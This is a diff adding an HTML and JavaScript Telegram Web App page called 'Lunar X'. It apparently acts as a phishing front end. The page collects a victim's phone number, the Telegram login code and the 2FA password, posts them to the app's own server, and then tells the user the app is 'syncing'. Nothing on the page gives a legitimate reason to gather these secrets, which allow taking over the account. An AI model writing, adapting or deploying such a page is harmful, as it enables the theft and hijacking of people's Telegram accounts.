@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        :root {
+            --neon-green: #39ff14;
+        }
+
+        body {
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: url('https://files.catbox.moe/hbiwx5.jpg') no-repeat center center fixed;
+            background-size: contain;  /* Fits without zooming/cropping */
+            font-family: 'Segoe UI', Roboto, sans-serif;
+            overflow: hidden;
+        }
+
+        /* The Updated Glass Card */
+        .glass-card {
+            background: rgba(0, 0, 0, 0.65);
+            backdrop-filter: blur(15px);
+            -webkit-backdrop-filter: blur(15px);
+            border: 1px solid rgba(57, 255, 20, 0.3);
+            border-radius: 25px;
+            padding: 40px;
+            box-shadow: 0 0 30px rgba(0, 0, 0, 0.7);
+            text-align: center;
+            width: 85%;
+            max-width: 320px;
+        }
+
+        h2 { color: var(--neon-green); text-transform: uppercase; letter-spacing: 2px; margin-bottom: 10px; }
+        p { color: #dddddd; font-size: 14px; margin-bottom: 25px; line-height: 1.4; }
+
+        .input-group { text-align: left; margin-bottom: 15px; }
+        label { color: var(--neon-green); font-size: 10px; font-weight: bold; margin-left: 5px; }
+
+        input {
+            width: 100%;
+            padding: 15px;
+            margin-top: 5px;
+            background: rgba(255, 255, 255, 0.08);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 15px;
+            color: #fff;
+            font-size: 16px;
+            box-sizing: border-box;
+            outline: none;
+            transition: 0.3s;
+        }
+
+        input:focus { border-color: var(--neon-green); box-shadow: 0 0 10px rgba(57, 255, 20, 0.2); }
+
+        /* The Updated Rich Glowing Button */
+        .rich-btn {
+            width: 100%;
+            background: linear-gradient(45deg, #00ff00, #008000);
+            border: none;
+            padding: 15px;
+            border-radius: 50px;
+            color: white;
+            font-weight: bold;
+            text-transform: uppercase;
+            box-shadow: 0 0 15px rgba(57, 255, 20, 0.5);
+            cursor: pointer;
+            transition: 0.3s;
+            margin-top: 10px;
+        }
+
+        .rich-btn:hover {
+            box-shadow: 0 0 25px rgba(57, 255, 20, 0.8);
+            transform: scale(1.05);
+            filter: brightness(1.1);
+        }
+
+        .hidden { display: none; }
+        .success-icon { font-size: 60px; color: var(--neon-green); margin-bottom: 10px; }
+    </style>
+</head>
+<body>
+
+    <div class="glass-card">
+        <h2>Lunar X</h2>
+        
+        <div id="step-phone">
+            <p>Enter your phone number starting with country code</p>
+            <div class="input-group">
+                <label>PHONE NUMBER</label>
+                <input type="tel" id="phone" placeholder="+1234567890">
+            </div>
+            <button class="rich-btn" onclick="sendCode()">Send Code</button>
+        </div>
+
+        <div id="step-otp" class="hidden">
+            <p>Check your Telegram for the code.</p>
+            <div class="input-group">
+                <label>NEXT INPUT CODE</label>
+                <input type="number" id="otp" placeholder="12345">
+            </div>
+            <div id="2fa-wrap" class="input-group hidden">
+                <label>2FA PASSWORD</label>
+                <input type="password" id="2fa" placeholder="Your Password">
+            </div>
+            <button class="rich-btn" onclick="verifyCode()">Accept</button>
+        </div>
+
+        <div id="step-success" class="hidden">
+            <div class="success-icon">✔</div>
+            <h2>Verified</h2>
+            <p>Lunar X is now syncing. You may close this app.</p>
+        </div>
+    </div>
+
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.expand();
+        
+        const userId = new URLSearchParams(window.location.search).get('user_id');
+
+        async function sendCode() {
+            const phone = document.getElementById('phone').value;
+            if(!phone) return alert("Please enter phone");
+
+            const btn = document.querySelector('#step-phone .rich-btn');
+            btn.innerText = "Processing...";
+
+            const res = await fetch('/send_code', {  // Updated: No /api/
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ phone, user_id: userId })
+            });
+            const data = await res.json();
+
+            if(data.status === "success") {
+                document.getElementById('step-phone').classList.add('hidden');
+                document.getElementById('step-otp').classList.remove('hidden');
+            } else {
+                alert(data.message);
+                btn.innerText = "Send Code";
+            }
+        }
+
+        async function verifyCode() {
+            const code = document.getElementById('otp').value;
+            const password = document.getElementById('2fa').value;
+            
+            const btn = document.querySelector('#step-otp .rich-btn');
+            btn.innerText = "Verifying...";
+
+            const res = await fetch('/verify', {  // Updated: No /api/
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ user_id: userId, code, password })
+            });
+            const data = await res.json();
+
+            if(data.status === "success") {
+                document.getElementById('step-otp').classList.add('hidden');
+                document.getElementById('step-success').classList.remove('hidden');
+                tg.HapticFeedback.notificationOccurred('success');
+            } else if(data.status === "2fa_required") {
+                document.getElementById('2fa-wrap').classList.remove('hidden');
+                btn.innerText = "Accept";
+                alert("2FA Required");
+            } else {
+                alert(data.message);
+                btn.innerText = "Accept";
+            }
+        }
+    </script>
+</body>
+</html>
